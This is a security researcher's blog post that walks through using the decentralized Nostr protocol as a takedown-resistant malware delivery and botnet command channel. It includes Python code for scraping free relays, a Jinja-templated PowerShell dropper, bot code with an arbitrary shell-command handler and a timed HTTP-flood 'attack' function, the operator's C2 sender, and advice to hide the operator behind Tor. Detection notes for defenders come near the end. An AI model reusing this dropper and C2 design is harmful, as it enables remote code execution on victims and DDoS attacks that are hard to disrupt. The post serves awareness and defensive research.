---
title: "Malware and Other Stuff"
summary: "Our malware mitigation sucks -- **Nostr** as a comm channel"
draft: false
---

### Intro

`There's this protocol that lets you post content without censorship, 
have you heard about it?`

While on vacation, a friend of mine mentioned this somewhat new protocol that lets you publish content as **<blue>Twitter-style</blue>** messages, and where you can subscribe to your own custom feeds, controlling the content you see.

The key point? The messages you publish are designed to be resistant to deletion, and thus hard to censor, promoting freedom of speech. 

Immediately my curiosity was caught. Hold on, we can host content thats hard, if not impossible, to take down? That sounds like the perfect use case for **<red>malware</red>**. Lets take a deeper look. 


## What is Nostr

So what is this mysterious protocol & network that lets us post **content** that **can't be taken down**?

**<i>Nostr</i>**, short for <u>Notes and Other Stuff Transmitted by Relays</u>, is a communication protocol that lets you publish and receive messages.

At its core, __Nostr__ is built around two concepts: **<blue>users<blue>** and **<yellow>relays<yellow>**. Users create messages, called events, and send them to relays. Other users can then request and read those events, from the relays. Unlike traditional social media platforms, there are no single central servers that can control the whole network or feeds.

The **<blue>users<blue>** identity in Nostr is based on Cryptographic keys. Each user has a **<green>public key<green>** and a **<red>private key</red>**. The **<green>public key<green>** is the equivalent of a username, while the **<red>private key</red>** is used to prove that messages were created by that **<blue>users<blue>**. You can think of the **<red>Private Key</red>** as authentication, and the **<green>public key<green>** as the authority. This means that your identity on the Nostr protocol is not tied any identifiable information, and is not stored by one company.

**<yellow>Relays<yellow>** are servers that pass these messages between **<blue>users<blue>**. Any message can be either posted to one or multiple relays. If one relay stops storing or sharing that message, the same content could still be available through some another relays. This makes the protocol robust to censorship and central points of failure, because the content is not stored or controlled on one place.

This is what makes **Nostr** interesting -- it separates identity, content, and infrastructure. The user owns only their key, **<yellow>relays<yellow>** provide transport and storage, and then applications can decide how the content is displayed. Because of this, Nostr can be understood less as a single social network and more as a <u>shared communication layer for decentralized applications</u>.

Keys that aren't tied to identifiable information, relays that don't coordinate, and content that persists -- these are the key points that make Nostr interesting for more than notes. Keen eyed of you would already guess where this is going.

## The Achilles Heel of malware

At my previous place of employment, we would tackle **<red>malware</red>** by essentially <u>take down requests</u>. Often times there's a dropper that compromises the victim via **<purple>phishing</purple>**, **<yellow>clickfix</yellow>**, or some other deceiving method for initial access. The dropper will then fetch the actual malware, or **<green>payload</green>**, from a C2 or some other relay.

After or during the breach, once the dropper lands on the desk of **<blue>Incident Response</blue>**, its often times easy to go and cut the spread of the malice or the communication channel for the threat actor by filing a takedown request to where the malware or C2 is hosted. In an investigation by the authorities, it is possible to catch the **<red>Threat Actor</red>** by finding out who owns the infrastructure from which the malware was spread during the campaign. 

But what if the <b><red>Threat Actor</red></b> didn't own the infrastructure? What if the server from which the dropper fetches the malware from could not be <u>taken down?</u> Could an attacker make their malware (near) **bulletproof**?

Of course I'm not the first to think this. There's a [proof-of-concept from 2023](https://github.com/ClarkQAQ/nrat) and [even a mention of the idea on Nostr itself](https://nostr.com/nevent1qqsgfpwgp28xkcvgf0qelq5uywkd37t2sf8pufn5wcnd9s63nc8l9kszyzyfkx0tg0he3c6ut8n9tdwx0hq3hyr9pw4k69pp6p66a7llgktn7a3h8qp). 


{{<figure src="/images/shaunscreenshot.png" width="800px" class="blog-img wide-img">}}

But even so it seems the idea remains largely unexplored. Lets take a deeper look.


## Delivering a payload via multiple possible relays

The core idea of **<green>Nostr</green>** is that your Notes and Other stuff are Relayed -- you push your content out into multiple nodes, which from anyone who wishes to, or you, can fetch them from using **<blue>your identity<blue>**, the **<green>Public Key</green>**. This feature is what makes our content **"bulletproof"**. Single takedown of a relay will only affect that relay. If we push our content into  **<yellow> 10 relays<yellow>**, to get our content off the internet there would have to be **<red>10 takedowns</red>** or bans from the relay owners. Meaning the more **<yellow>relays<yellow>** we use, the better.

Interacting with a relay is quite simple:
```python
#
#  From interact.py, push()
#

""" First we create an identity:                   """
from pynostr.key         import PrivateKey

PRIVATE_KEY = PrivateKey()
PUBLIC_KEY  = PRIVATE_KEY.public_key.hex()


""" Afterwhich we can add the desired relay:       """
relay_manager = RelayManager()
relay_manager.add_relay( relay )


""" Content is an signed event  """
event = Event(
    content = user_content
)
event.sign( PRIVATE_KEY.hex() )


""" And then we can push the event into the relay: """
relay_manager.publish_event( event )
relay_manager.run_sync()
```

To later on fetch the content we've just now pushed, we need to store the `PUBLIC_KEY`. That's the **<blue>"username"</blue>** equivalent of this network. Here's how we can fetch the content under that identity:
```python
#
#  From interact.py, pull()
#
""" Add the relay """
relay_manager = RelayManager()
relay_manager.add_relay( relay )

# adjust filters where necessary
filters = FiltersList([
    Filters(
        authors = [ PUBLIC_KEY ],
        kinds   = [ 1 ],
        limit   = 5
    )
])


""" Add a new 'subscription' """
sub_id = "arbitrary_sub"
relay_manager.add_subscription_on_all_relays(sub_id, filters)
relay_manager.run_sync()


""" Get the Events """
while relay_manager.message_pool.has_events():
        raw_msg = relay_manager.message_pool.get_event()
        ...
```

In my proof of concept code, I only stripped the "content" part out of the raw_msg. This is the "user_content" part we pushed into the relay in the code snippet above. This is basically how you interact with **<green>Nostr</green>** -- super simple!

Now, lets find some **<yellow>relays<yellow>** to use. We need to find a list of **<yellow>relays<yellow>**, and **<green>enumerate</green>** through them to find the ones that can be used for free. We can abstract the above interactions into `push()` and `pull()`.
```python
#
#   scrape.py
#

for relay in relays:
    
""" Send a SHA of the Relay URL as a message into the relay.     """
    push( 
        user_content = shahify( relay ),
        relay        = relay,
        private_key  = PRIVATE_KEY,    
    )
    
""" Check the relay -- if the SHA of the relay is returned,
    it's open for free to use, 
    and doesn't mess with the integrity of the message.          """
    msg = pull( 
        relay      = relay,
        public_key = PUBLIC_KEY,
    )
    
    if shahify( relay ) == msg:
        log( relay ) # Store the result.
```

Now that we have a way to interact with the network, we can store our **<red>malware</red>** in there. Or could. Instead of storing **<blue>executables</blue>**, for now the **<green>proof-of-concept</green>** focuses on smaller payloads. The core idea is quite simple. We push our malicious payload into as many **<yellow>relays<yellow>** as we can, and the **<purple>implant/dropper</purple>** will try to fetch the payload from each one of them until it succeeds. This way, if some of them are taken down, as long as one of them has the payload, the **<purple>implant/dropper</purple>** is still operational.

{{<figure src="/images/multiple_relays.png" width="900px" class="blog-img wide-img">}}

**<green>Pushing</green>** the content itself is now established, but lets look at how we can make the **<yellow>relays<yellow>** we know we've pushed the **<red>malware</red>** into known by the **<purple>dropper</purple>**. For the sake of simplicity, the **<purple>implant/dropper</purple>** in this case is built as an `.ps1`. Initial Access is left as an exercise for the reader.

There are two necessary variables for the dropper-`.ps1` file that enable it to fetch content from the Nostr network. Those are `PublicKey` and `Relay`. Because we want to try multiple **<yellow>relays<yellow>**, we will write them down to a list, and on the **<purple>dropper</purple>** try each one until we succeed in fetching the payload. We can use **<blue>Jinja</blue>** templates to put these details in place:
```cmd
$Relays = @(
{% for relay in relays %}
    "{{ relay }}"{% if not loop.last %},{% endif %}
{% endfor %}
)

$PublicKey = "{{ publickey }}"
```
And once we've pushed the content into the relays, we store the relays into the list, and render it into the `.ps1` file: 
```python
# main.py
dropper_file = render_malware( 
    "./templates/malw.ps1", 
    relays, 
    PUBLIC_KEY 
)


# render_malware.py
from jinja2 import Template

def render_malware( template_path : str, relays : list, publickey : str ):
    # Read the template
    ...

    # Render the template
    rendered_template = template.render(
        relays    = relays,
        publickey = publickey, 
    )

    return rendered_template

``` 

Afterwhich we can simply write the template into a script file that we can **<blue>execute</blue>** on the victim host. If everything works as planned, upon the run, the payload is executed immediately after connection. Here we've pushed a payload that opens `calc.exe` onto the network, and we run the `.ps1` on the victim windows host:

{{<figure src="/images/nostr_demo.png" width="800px" class="blog-img">}} 

Lovely! But this is simple stuff. Lets push for something slightly more **<yellow>complex.</yellow>**

## Bots & Skid malware

For the next section we have to take a brief look into **<red>botnets</red>** of the past. Back when I was younger, I used to lurk on all sorts of **<yellow>cyberforums</yellow>** and chats. Back then, it was common to boast about how capable your "booter" (DoS tool) was, or how many bots you have in your **<red>botnet</red>**. At the time, these were often quite simple setups that were thoroughly glazed for street rep:

{{<figure src="/images/boats.png" width="800px" class="blog-img">}} 

There were scripts floating around that showcased the basic methodology. To build a small net, exactly as the picture above shows, the attacker would take a **<yellow>CVE</yellow>** with an **<red>RCE</red>**, craft an exploit that takes control of the host and launches a bot-process, that then connects to an **<green>IRC</green>** server of their choosing. After testing that it works locally, they would scan the web for that specific **<purple>vulnerability<purple>** and spread to as many servers as possible. The bots would have certain commands built in, such as "!attack", "!udp", "!tcp", and so on. If seen in the **<green>IRC</green>** chat posted by the "admin" user, the bot would launch a corresponding attack on the chosen target. 

This is the structure we're going to reproduce -- **<yellow>a command channel</yellow>** for the operator, with bots that listen and act. The only difference is that we're swapping **<green>IRC</green>** for something that can't be taken down with one action.

## Using Nostr for comms on a botnet

One-way communication channel from the Attacker to the Bot is perfect for exactly this use. When the **<red>Threat Actor</red>** wants to launch a **<red>DDoS attack</red>** for example, there isn't a need for a response from the bot side -- it's only required to be able to relay the target address, the attack type and attack time to the bot. 

For simplicity, let's use the ever lovely & verbose **<blue>Python</blue>** for this Bot & C2. We can begin by defining the different commands on the bot:

```py
""" COMMANDS """ 

def attack( args : str ):
    # Args should be a string in format of:
    # "target,timestamp" -> "victim.org,13333337"
    params            = args.split(",")
    target, timestamp = str( params[ 0 ] ), int( params[ 1 ].split(".")[0] ) 
    
    # Wait for the timestamp to pass.
    while time.time() < round(timestamp):
        time.sleep( 1 )
        continue
    
    # booo! scary DoS attack.
    _ = requests.get( f"http://{target}" )


def cli( args ): 
    os.system( args )


def disconnect( _ ):
    # os.system( "rm ./*.py" ); os.system( "rm ./*pycache*" )
    exit()


""" Bind the function calls into keys """
COMMANDS = {
    "cli"        : cli,
    "attack"     : attack,
    "disconnect" : disconnect, 
}

```

Because the **<yellow>relays<yellow>** don't work instantaneously, sometimes some bots could get their command significantly faster than the rest. For a **<red>denial of service attack</red>** it's crucial to try and pump as many packets at once as possible, so we have to implement a **<green>timestamp</green>** to wait for before the attack is launched. Since we want to keep everything as simple as possible, we want to use only strings as args for the functions. For multiple args, we can simply use **<purple>CSV</purple>** style of encoding, where we split each argument with a comma.  

The bot needs to be connected to the **<blue>network</blue>** for it to be able to receive the **<yellow>commands</yellow>**. We can implement a loop that iterates through the possible relays, and tries to acquire the command.

```py

# Global Variables
HEARTBEAT : int  = 60 * random.randint( 1, 15 )
...

while 1:
    # Iterate through the relays. 
    # Upon first successful play of the command,
    # stop and wait for a new one.
    for relay in RELAYS:
        messages =  pull(
            relay      = relay,
            public_key = C2_PUBLIC_KEY, 
        )
            
        # No message received from the relay.
        ...
            
        # Do not replay seen messages.
        last_message      = pick_last( messages )
        last_message_hash = hash(str(last_message))
        
        if last_message_hash in messages_seen:
            continue
            
        # Mark message seen and play it. 
        messages_seen[ last_message_hash ] = 1

        # Execute command is opened further below
        execute_command( last_message ) 
        break
    
    # Heartbeat to reduce noise.
    time.sleep( HEARTBEAT )
```

This is slightly **<blue><u>noisy</u></blue>**, making detection easier. To remedy it ever so slightly, we can vary the interval for the fetch with `HEARTBEAT` and any **<red>attack</red>** we launch we couple with a target time.


Now let's look at the C2 side:
```py

""" ACTIONS / COMMANDS """

def cli_command( user_input ):
    # CLI command can be sent as is.
    nostr_connection.send_payload({
        "args"    : user_input,
        "command" : "cli"    
    })
    

def attack_command( user_input ):
    # attack command requires a CSV format: 
    # "VICTIM,TIMESTAMP" because of the heartbeat.
    # Not every bot will receive the command at the
    # same time, which we can remedy by setting 
    # a unix timestamp as the "goal" for the time
    # of the attack.
    nostr_connection.send_payload({
        "args"    : user_input + "," + str( time.time() + 60 ),
        "command" : "attack"    
    })


def disconnect( _ ):
    # No user input required ; ignore it.
    nostr_connection.send_payload({
        "args"    : "_",
        "command" : "disconnect"    
    })
    
    # After connection, 
    # all bots connecting are gonna disconnect upon new entry.
    # If you wish to start the net again, send a padding:
    nostr_connection.send_payload({ "padding" : "padding" })
```

As I said, let's keep it simple. Each **<red>payload</red>** is just a dict `{ "command" : command, "args" : args }` turned into a dict, and relayd through the **<green>Nostr network</green>**. The parsing on the bot side this way is super simple. We turn the message we get from the relay into **<blue>JSON</blue>** if we can, and just get the values of both keys. We can then check if the `command` value as string is found from the `COMMANDS` Dict, and directly call it with the args we get from `args`. 
```py

def execute_command( message : dict ) -> bool:
    raw_msg = message[ "content" ]
    
    payload = json.loads( raw_msg )
    
    # Check that necessary keys exist
    try:
        command   = payload[ "command" ]
        arguments = payload[ "args" ]
    except KeyError:
        return False
    
        
    # Play the command. On fail to execute, 
    # simply ignore and reset the loop.
    try: 
         COMMANDS[ command ]( arguments )
    except Exception: 
        return False
    
    return True

```  

Now it is just creating a UI, which can be done in any way you please, even as a website.


## Identity and masking there of

**<green>Nostr</green>** is clever because it doesn't tie **<blue>identity</blue>** to content -- just a public key. If you do not **<yellow>"bu</yellow><red>rn"</red>** your key yourself by pushing identifiable information to the **<purple>network</purple>** under that key, there is no way to backtrack from the key alone who has made the publication. In case of an investigation, the other possible datapoint is the connection between the **<yellow>relay</yellow>** and the user. The **<yellow>relay</yellow>** sees three things:
1. The content published
2. The key public key & signatures for the event/content
3. **The IP address** from which the publication has been made.

If the user publishes content into the **<purple>network</purple>** via an IP address thats identifiable to them (residential network connection, a VPS, so on..), it's possible for the owner of the **<yellow>relay</yellow>** to tie the **<green>public key</green>** **<blue>identity</blue>** to an identifiable person. 

_<ins>So, if the relays just do logging of the IPs, we can potentially catch the attacker?</ins>_

Well, in the best case. Because the protocol is accessible via **<red>WebSockets</red>**, the threat actor can simply move their "infra" into a HTML page, that uses the **<red>WS</red>** library to connect to **<green>Nostr</green>**, and open that page on the Tor browser. Where the page is hosted doesn't even matter -- all the connections between the **<green>Nostr</green>** **<yellow>relays<yellow>** and the Threat Actor are now masked by the **<purple>Tor network</purple>**, meaning we can't tie the **<blue>identity</blue>** with the IP address. 


## So.. what?

So what is the big deal? From my understanding, this network enables malware in a way that is very difficult, **if not impossible**, to **disrupt once after infection.** The **<green>Nostr</green>** protocol is great, and offers a good approach to censorship and anonymity on the internet. I imagine the wide spread adaptation of this protocol in future for all things amazing will likely happen. More users mean more **<yellow>relays<yellow>** -- more **<yellow>relays<yellow>** means its **<red>harder</red>** & **<red>harder</red>** to censor content.. or stop malware. From my perspective, it's only a matter of time until we see implementations of this technique in actual **<red>malware</red>** out in the wild. In the case of an **<red>botnet</red>** operator, a communication channel thats practically impossible to cut off en masse is quite attractive. This method can't be sinkholed in a simple way, and the servers (given a good amount of relays) are difficult to take all down at once. 

And of course the **<blue>protocol</blue>** has it's limitations. Many relays require payments, and some might drop your keys or content, the connection to the relays is noisy.. But in practice, these are mostly friction points rather than full-stop walls. There is no single point of failure, as long as the implant can reach one usable relay that still carries the event, the communication path survives. **<purple>For defenders</purple>**, the friction makes noise that are actually the most actionable signals: a host making periodic **<green>WebSocket</green>** connections to known Nostr relay domains, on a randomized interval, fetching events under a consistent public key, is a pattern worth flagging. The protocol definitely wasn't built for stealth. It was built for resilience.

<!-- This also poses a question: <u>Are our reactive methods of fighting Malware good enough?</u>-->

That being said, the code snippets in this blog are from my proof-of-concept repository. You can find it here: **[Vsimpro/nostril](https://github.com/Vsimpro/nostril)**

Please don't go and use this for evil. This article is meant to raise awarness, and potentially spark some conversation on how to mitigate such botnets. I hope you had a pleasant read, for any feedback and thoughts don't hesitate to hit me up :)
<br>
<br>
Until next time,
<br>-Vs1m.
<br>
<br>